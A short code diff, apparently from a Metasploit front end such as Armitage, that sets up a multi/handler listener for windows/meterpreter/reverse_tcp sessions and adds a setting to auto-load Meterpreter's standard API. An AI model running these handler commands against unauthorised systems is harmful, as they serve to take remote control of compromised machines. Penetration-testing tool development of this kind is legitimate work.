@@ -161,6 +161,7 @@ sub setupHandlers {
 				@("use exploit/multi/handler",
 				"set PAYLOAD windows/meterpreter/reverse_tcp",
 				"setg LPORT " . randomPort(),
+				"setg AutoLoadStdapi true",
 				"exploit -j")
 			, { });
 		}
